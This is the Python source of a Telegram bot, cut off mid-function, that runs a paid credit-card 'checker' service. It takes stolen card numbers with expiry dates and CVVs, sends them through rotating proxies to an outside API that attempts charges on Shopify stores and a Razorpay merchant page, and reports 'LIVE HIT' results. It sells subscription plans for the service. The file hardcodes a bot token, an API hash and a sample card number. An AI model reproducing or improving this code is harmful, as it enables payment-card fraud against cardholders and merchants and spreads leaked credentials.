from telethon import TelegramClient, events, Button
from telethon.errors import UserNotParticipantError
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
from concurrent.futures import ThreadPoolExecutor
import functools
import aiohttp
import aiofiles
import os
import sys
import random
import time
import json
import re
import string
from datetime import datetime, timedelta

API_ID = 39027759
API_HASH = 'ea20df34f5f44c21c493eff664559ba3'
BOT_TOKEN = '8595500059:AAFV-eSOx6ZYr-e4f8dIjtz-th8kQ_AzIAs'
ADMIN_ID = [7734153365]

# ─── SINGLE INSTANCE LOCK ────────────────────────────────────────────────────
# Prevents double responses caused by running two bot processes at the same time.
PID_FILE = 'bot.pid'

def _acquire_single_instance():
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                old_pid = int(f.read().strip())
            os.kill(old_pid, 0)   # raises if process is gone
            print(f"❌ Bot is already running (PID {old_pid}). "
                  f"Kill it first: kill {old_pid}")
            sys.exit(1)
        except (ProcessLookupError, ValueError, OSError):
            pass  # stale PID file — safe to overwrite

    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

    import atexit
    def _cleanup():
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
    atexit.register(_cleanup)

_acquire_single_instance()
# ─────────────────────────────────────────────────────────────────────────────
CHECKER_API_URL      = 'http://62.72.20.10:8081/'
RAZORPAY_API_URL     = 'https://notfrrx-razorpay.up.railway.app/rz'
RAZORPAY_MERCHANT_URL = 'https://razorpay.me/@mstechnomedia'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
CODES_FILE = 'codes.json'
USERS_FILE  = 'users.json'
GROUP_LINK  = 'https://t.me/+td8TrhA9ctY3NTc0'

PLANS = {
    'FREE':     {'price': 'Free', 'days': 30,  'cc_limit': 100,  'emoji': '🆓', 'group_only': True},
    'BASIC':    {'price': '$1',   'days': 1,   'cc_limit': 500,  'emoji': '🥉', 'group_only': False},
    'STANDARD': {'price': '$2',   'days': 5,   'cc_limit': 1000, 'emoji': '🥈', 'group_only': False},
    'PREMIUM':  {'price': '$7',   'days': 15,  'cc_limit': 2000, 'emoji': '🥇', 'group_only': False},
    'VIP':      {'price': '$15',  'days': 30,  'cc_limit': 5000, 'emoji': '👑', 'group_only': False},
}

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
pending_addsites  = {}   # user_id -> {sites, proxies, msg_id}
pending_sitecheck = {}   # user_id -> {sites, proxies, msg_id}

# One check at a time per user (prevents server overload from multiple parallel mass checks)
user_active_check = {}   # user_id -> {'type': 'chk' or 'mrz', 'session_key': str, 'chat_id': int, 'msg_id': int}

# For proxy checking stop functionality
current_proxy_check = {
    'task': None,
    'alive_proxies': [],
    'status_msg': None,
    'new_proxies': []
}

# ================== HIT LOG CHANNEL (NEW FEATURE) ==================
# Jab bhi kisi user ko Charged ya Approved hit mile, yahan log jayega
HIT_LOG_CHANNEL = -1004337538552

# ================== CHANNEL JOIN VERIFICATION ==================
VERIFIED_USERS_FILE = "verified_users.txt"

def is_user_verified(user_id):
    if not os.path.exists(VERIFIED_USERS_FILE):
        return False
    try:
        with open(VERIFIED_USERS_FILE, 'r') as f:
            verified = [line.strip() for line in f if line.strip()]
        return str(user_id) in verified
    except:
        return False

def mark_user_verified(user_id):
    try:
        with open(VERIFIED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
    except:
        pass

# Channel links
LOGS_CHANNEL = "https://t.me/ECLIPSON_X_CHECKER_GC"
CHECKING_CHANNEL = "https://t.me/ECLIPSON_X_CHECKER_GC"
UPDATES_CHANNEL = "https://t.me/+-emi1OwpU8swMDVl"


PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def price_in_range(raw_price, min_p, max_p):
    """Return True if raw_price falls inside [min_p, max_p].
    Handles: '$5.99', 'USD 5.99', '5,99' (EU decimal), '$1,500' (thousands sep)."""
    try:
        clean = re.sub(r'[^\d.,]', '', str(raw_price))
        if not clean:
            return False
        # Thousands format: 1,500 or 1,500.00 → 1500
        if re.match(r'^\d{1,3}(?:,\d{3})+(?:\.\d+)?$', clean):
            clean = clean.replace(',', '')
        elif ',' in clean and '.' not in clean:
            clean = clean.replace(',', '.')  # European: 5,99 → 5.99
        val = float(clean)
        return val > 0 and min_p <= val <= max_p
    except (ValueError, TypeError):
        return False

def make_progress_bar(checked, total, length=16):
    if total == 0:
        return "░" * length + " 0%"
    filled = int((checked / total) * length)
    bar = "█" * filled + "░" * (length - filled)
    pct = int((checked / total) * 100)
    return f"{bar} {pct}%"

def get_main_menu_keyboard(user_id=None, is_free=False):
    if is_free:
        buttons = [
            [Button.inline("Cmd", b"show_cmds", style="success"),
             Button.url("Channel", GROUP_LINK, style="success")],
            [Button.url("Upgrade", "https://t.me/ECLIPSON_X_CHECKER_GC", style="success")],
        ]
    else:
        buttons = [
            [Button.inline("Cmd", b"show_cmds", style="success"),
             Button.url("Channel", "https://t.me/+-emi1OwpU8swMDVl", style="success")],
            [Button.url("Upgrade", "https://t.me/+-emi1OwpU8swMDVl", style="success")],
        ]

    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline("Admin Panel", b"admin_panel", style="success")])

    return buttons


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

# ─── PLAN / REDEEM CODE HELPERS ─────────────────────────────────────────────

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def load_users_data():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_users_data(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def generate_code(plan_key):
    chars = string.ascii_uppercase + string.digits
    codes = load_codes()
    # Retry until unique code found (collision guard)
    for _ in range(10):
        part1 = ''.join(random.choices(chars, k=4))
        part2 = ''.join(random.choices(chars, k=4))
        code = f"{plan_key[:3]}-{part1}-{part2}"
        if code not in codes:
            break
    codes[code] = {
        'plan': plan_key,
        'used': False,
        'used_by': None,
        'used_at': None,
        'created_at': datetime.now().isoformat(),
    }
    save_codes(codes)
    return code

def redeem_code(user_id, code):
    """Returns ('ok', info) | ('not_found', None) | ('used', None)"""
    codes = load_codes()
    # Clean the code thoroughly
    code = code.upper().strip().replace(" ", "").replace("\n", "").replace("\t", "")
    
    if code not in codes:
        return 'not_found', None
    if codes[code]['used']:
        return 'used', None

    plan_key = codes[code]['plan']
    plan = PLANS[plan_key]
    uid = str(user_id)
    users = load_users_data()

    # Prevent multiple redeems while plan is active (skip for admins + FREE users)
    if user_id not in ADMIN_ID and uid in users:
        user_data = users[uid]
        current_plan = user_data.get('plan', 'FREE')
        
        # FREE users can always redeem
        if current_plan == 'FREE':
            pass  # allow redeem
        else:
            try:
                current_expiry = datetime.fromisoformat(user_data.get('expires_at', '2000-01-01'))
                if datetime.now() < current_expiry:
                    return 'already_active', None
            except:
                pass

    expires_at = datetime.now() + timedelta(days=plan['days'])
    users[uid] = {
        'plan': plan_key,
        'expires_at': expires_at.isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)
    codes[code]['used']    = True
    codes[code]['used_by'] = uid
    codes[code]['used_at'] = datetime.now().isoformat()
    save_codes(codes)

    # Log Plan Upgrade
    try:
        old_plan = "FREE"
        users_data = load_users_data()
        if uid in users_data:
            old_plan = users_data[uid].get('plan', 'FREE')
        asyncio.create_task(log_plan_upgrade(user_id, "User", old_plan, plan_key))
    except:
        pass

    return 'ok', {'plan_key': plan_key, 'plan': plan, 'expires_at': expires_at}

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    """Admin = always premium. Others need an active plan."""
    if user_id in ADMIN_ID:
        return True
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return False
    try:
        expires_at = datetime.fromisoformat(users[uid]['expires_at'])
        return datetime.now() < expires_at
    except Exception:
        return False

def get_cc_remaining(user_id):
    """Returns remaining CC checks. -1 = unlimited (admin)."""
    if user_id in ADMIN_ID:
        return -1
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 0
    try:
        expires_at = datetime.fromisoformat(users[uid]['expires_at'])
        if datetime.now() >= expires_at:
            return 0
        return max(0, users[uid]['cc_limit'] - users[uid].get('cc_used', 0))
    except Exception:
        return 0

def increment_cc_used(user_id, count=1):
    if user_id in ADMIN_ID:
        return
    users = load_users_data()
    uid = str(user_id)
    if uid in users and users[uid].get('plan') not in ('FREE', None):
        users[uid]['cc_used'] = users[uid].get('cc_used', 0) + count
        save_users_data(users)

def assign_free_plan(user_id):
    """Give user the FREE plan only if they have no existing active plan."""
    if user_id in ADMIN_ID:
        return
    users = load_users_data()
    uid = str(user_id)
    existing = users.get(uid)
    if existing:
        try:
            exp = datetime.fromisoformat(existing['expires_at'])
            if datetime.now() < exp:
                return  # active plan exists — never overwrite
        except Exception:
            return  # can't parse expiry → keep existing data safe, don't overwrite
    plan = PLANS['FREE']
    users[uid] = {
        'plan': 'FREE',
        'expires_at': (datetime.now() + timedelta(days=plan['days'])).isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)

def can_check(user_id, is_private=True):
    """
    Returns a status string:
      'ok'         – allowed
      'no_plan'    – no plan assigned at all
      'expired'    – plan expired
      'group_only' – FREE plan, must use group
    """
    if user_id in ADMIN_ID:
        return 'ok'
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 'no_plan'
    data = users[uid]
    plan_key = data.get('plan', 'FREE')
    plan = PLANS.get(plan_key, PLANS['FREE'])
    try:
        if datetime.now() >= datetime.fromisoformat(data['expires_at']):
            return 'expired'
    except Exception:
        return 'expired'
    if plan.get('group_only', False) and is_private:
        return 'group_only'
    # Note: CC limits are now enforced per-session inside /chk and /mrz
    # (not cumulative/lifetime). This applies to ALL plans including paid.
    return 'ok'

def is_site_dead(response_msg, gateway, price):
    """Strict check used for actual CC checking — validates response, gateway AND price."""
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    return False

def is_site_dead_for_test(response_msg, gateway):
    """
    FIX #1 — Relaxed check used ONLY for test_site().
    Price is intentionally NOT checked here: many valid Shopify stores return
    price='-' when the checker API can't resolve a product, but the gateway
    is real and the site IS alive for CC checking purposes.
    """
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        if not site.startswith('http'):
            site = f'https://{site}'

        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy

        # New API format: ?{card}&url={site}&proxy={proxy}
        url = f'{CHECKER_API_URL}?{card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}

                try:
                    raw = await resp.json()
                except Exception:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        response_msg = raw.get('Response', raw.get('message', ''))
        price        = raw.get('Price', '-')          # Already formatted e.g. "6.00 USD"
        gateway      = raw.get('Gate', raw.get('Gateway', raw.get('gateway', 'Shopify')))

        if is_site_dead(response_msg, gateway, price):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # Proxy-related errors from the API = retry, not a dead card
        proxy_error = any(k in response_msg.lower() for k in ['proxy', 'tunnel', 'connect failed', 'connection error', 'socks'])
        if proxy_error:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # API returns "True"/"False" strings for Charged and Approved
        charged  = str(raw.get('Charged',  'False')).strip().lower() == 'true'
        approved = str(raw.get('Approved', 'False')).strip().lower() == 'true'

        # FIX: Treat "Otp_Required" (or similar) in Response as Approved
        # Many Shopify checkers return this when card triggers 3DS/OTP step → indicates live/good card
        response_lower = (response_msg or '').lower()
        otp_required = any(x in response_lower for x in ['otp_required', 'otp required', 'otprequired', 'requires otp', 'otp step'])

        if charged:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif approved or otp_required:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

# FIX #4 — fixed inconsistent indentation on the proxies return
async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}


# ─── RAZORPAY CHECKER ────────────────────────────────────────────────────────

async def check_razorpay(card, proxy=None):
    try:
        proxy_str = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, u, p = parts
                proxy_str = f"{ip}:{port}:{u}:{p}"
            elif len(parts) == 2:
                proxy_str = f"{parts[0]}:{parts[1]}"
            else:
                proxy_str = proxy

        url = f'{RAZORPAY_API_URL}?cc={card}&url={RAZORPAY_MERCHANT_URL}&amount=1'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except Exception:
                    text = await resp.text()
                    raw = {'Response': text, 'Status': 'UNKNOWN'}

        api_status   = raw.get('Status', '').upper()
        code_field   = raw.get('Code', '')
        response_msg = raw.get('Response', '')
        amount       = raw.get('Amount', '₹1')
        response_low = response_msg.lower()

        # Display: always show Code field in bot Response area
        display_msg  = code_field

        # Proxy-related errors → retry (check both Code and Response)
        proxy_keys = ['proxy', 'tunnel', 'connect failed', 'connection error', 'socks']
        if any(k in code_field.lower() for k in proxy_keys) or any(k in response_low for k in proxy_keys):
            return {'status': 'Dead', 'message': display_msg, 'card': card, 'retry': True}

        # Charged: Status field OR Response text
        if api_status == 'CHARGED' or 'transaction success' in response_low:
            return {'status': 'Charged', 'message': display_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}

        # Approved: known Status values OR exact Response strings user provided
        approved_statuses = ('APPROVED', 'CCN', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
                             'DO_NOT_HONOR', 'CARD_DECLINED', 'INVALID_CVV')
        approved_responses = [
            'your payment could not be completed due to insufficient account balance. try another card or payment method.',
            'the cvv provided is incorrect',
            'you have entered an incorrect cvv number. try again.',
        ]
        if (api_status in approved_statuses
                or any(k in response_low for k in approved_responses)):
            return {'status': 'Approved', 'message': display_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}

        return {'status': 'Dead', 'message': display_msg, 'card': card, 'gateway': 'Razorpay', 'price': amount}

    except asyncio.TimeoutError:
        return {'status': 'Dead', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'retry': True}


async def check_razorpay_with_retry(card, proxies, max_retries=2):
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    last_result = None
    for attempt in range(max_retries):
        proxy = random.choice(proxies)
        result = await check_razorpay(card, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return last_result or {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

async def send_realtime_hit(chat_id, result, hit_type, username):
    """Sends live hit to the same chat where /chk was triggered (group or private)."""
    if hit_type == "Charged":
        header = "💎 LIVE HIT — CHARGED"
    else:
        header = "✅ LIVE HIT — APPROVED"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = (
        f"<b>{header}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{result['card']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>  {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b> {result['message']}\n"
        f"💸 <b>Price</b>    {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 {brand} · {bin_type} · {level}\n"
        f"🏦 {bank}\n"
        f"🌍 {country} {flag}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    try:
        await bot.send_message(chat_id, premium_emoji(message), parse_mode='html')
    except Exception:
        pass


# ================== NEW FEATURE: HIT LOGS ==================
async def log_plan_upgrade(user_id, username, old_plan, new_plan, method="Redeem Code"):
    """Sends beautiful Plan Upgrade log to HIT_LOG_CHANNEL"""
    if not HIT_LOG_CHANNEL:
        return

    try:
        plan_data = PLANS.get(new_plan, {})
        emoji = plan_data.get('emoji', '💎')
        days = plan_data.get('days', 0)
    except:
        emoji = '💎'
        days = 0

    log_text = (
        f"🎉━━━━━━━━━━━━━━━━━━━━━━🎉\n"
        f"     ✨ <b>PLAN UPGRADED</b> ✨\n"
        f"🎉━━━━━━━━━━━━━━━━━━━━━━🎉\n\n"
        f"👤 <b>User</b>       : <code>{user_id}</code> (@{username})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 <b>Plan</b>       : {old_plan} → {emoji} <b>{new_plan}</b>\n"
        f"📅 <b>Validity</b>   : {days} Days\n"
        f"💳 <b>Method</b>     : {method}\n"
        f"🕒 <b>Time</b>       : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎊 Congratulations on your upgrade! 🎊"
    )

    try:
        await bot.send_message(HIT_LOG_CHANNEL, premium_emoji(log_text), parse_mode='html')
    except Exception as e:
        print(f"[Plan Upgrade Log Error] {e}")


async def log_hit_to_channel(result, hit_type, user_id, username, check_type="Mass Check"):
    """Sends beautiful hit log to the specified HIT_LOG_CHANNEL"""
    if not HIT_LOG_CHANNEL:
        return

    # Auto fetch plan name
    plan_name = "Unknown"
    try:
        users = load_users_data()
        user_data = users.get(str(user_id), {})
        plan_key = user_data.get('plan', 'FREE')
        plan = PLANS.get(plan_key, {})
        plan_name = f"{plan.get('emoji', '💎')} {plan_key}"
    except Exception:
        pass

    if hit_type == "Charged":
        emoji = "💎"
    else:
        emoji = "✅"

    log_message = (
        f"{emoji} <b>HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User</b>       : <code>{user_id}</code> (@{username})\n"
        f"💎 <b>Plan</b>       : {plan_name}\n"
        f"🔧 <b>Check Type</b> : {check_type}\n"
        f"🕒 <b>Time</b>       : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>    : {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b>   : {result['message']}\n"
        f"💸 <b>Price</b>      : {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    try:
        await bot.send_message(HIT_LOG_CHANNEL, premium_emoji(log_message), parse_mode='html')
    except Exception as e:
        print(f"[Hit Log Error] {e}")


async def update_progress(chat_id, user_id, message_id, results, current_attempt_count):
    """Updates progress message in the same chat where /chk was triggered."""
    total = results.get('total', 0)
    checked = len(results['charged']) + len(results['approved']) + len(results['dead'])

    last_card     = results.get('last_card', 'Waiting...')
    last_price    = results.get('last_price', '-')
    last_response = results.get('last_response', 'Waiting...')

    progress_text = (
        f"🔄 <b>Checking Progress...</b>\n\n"
        f"💳 <b>Card</b>     » <code>{last_card}</code>\n"
        f"📝 <b>Response</b> » {last_response}\n"
        f"💰 <b>Price</b>    » {last_price}\n\n"
        f"✅ <b>Charged</b>  » {len(results['charged'])}\n"
        f"🔥 <b>Approved</b> » {len(results['approved'])}\n"
        f"❌ <b>Declined</b> » {len(results['dead'])}\n"
        f"📊 <b>Progress</b> » {checked}/{total}\n\n"
        f"⚡ Powered by @UNTAMEDU"
    )

    buttons = [
        [Button.inline("STOP", f"stop_{user_id}".encode(), style="danger")]
    ]

    try:
        await bot.edit_message(chat_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except Exception:
        pass


async def send_final_results(chat_id, results):
    """UI UPGRADE — polished final results message with hits list."""
    charged_count = len(results['charged'])
    approved_count = len(results['approved'])
    dead_count = len(results['dead'])
    total = results.get('total', charged_count + approved_count + dead_count)

    hits_lines = []
    for r in results['charged'][:5]:
        hits_lines.append(f"💎 <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")
    for r in results['approved'][:5]:
        hits_lines.append(f"✅ <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")

    hits_text = "\n".join(hits_lines) if hits_lines else "  No hits this run."

    summary = (
        f"<b>✅ CHECK COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>RESULTS</b>\n"
        f"   💎 Charged  : {charged_count}\n"
        f"   ✅ Approved : {approved_count}\n"
        f"   ❌ Declined : {dead_count}\n"
        f"   📦 Total    : {total}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>HITS</b>\n"
        f"{hits_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by @UNTAMEDU"
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ayano{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write("=" * 40 + "\n\n")

        await f.write(f"CHARGED ({charged_count}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")

        await f.write(f"APPROVED ({approved_count}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")

        await f.write(f"DECLINED ({dead_count}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")

    await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except Exception:
        pass


# ─── SITE / PROXY TESTING ───────────────────────────────────────────────────

async def test_site(site, proxy):
    """
    FIX #1 — uses is_site_dead_for_test() which does NOT check price.
    FIX #5 — handles unknown proxy formats (uses proxy as-is instead of silently dropping it).
    """
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'

        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                # FIX #5: unknown format — pass it as-is rather than silently ignoring
                proxy_str = proxy

        # New API format for site testing
        url = f'{CHECKER_API_URL}?{test_card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = await resp.json()
                except Exception:
                    return {'site': site, 'status': 'dead'}

        response_msg = raw.get('Response', '')
        gateway      = raw.get('Gate', raw.get('Gateway', ''))

        # FIX #1: only check response + gateway for site testing, ignore price
        if is_site_dead_for_test(response_msg, gateway):
            return {'site': site, 'status': 'dead', 'price': '-'}
        else:
            # Return raw price so price-filter can use it
            raw_price = raw.get('Price', '-')
            return {'site': site, 'status': 'alive', 'price': raw_price}
    except Exception:
        return {'site': site, 'status': 'dead', 'price': '-'}


async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'

        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
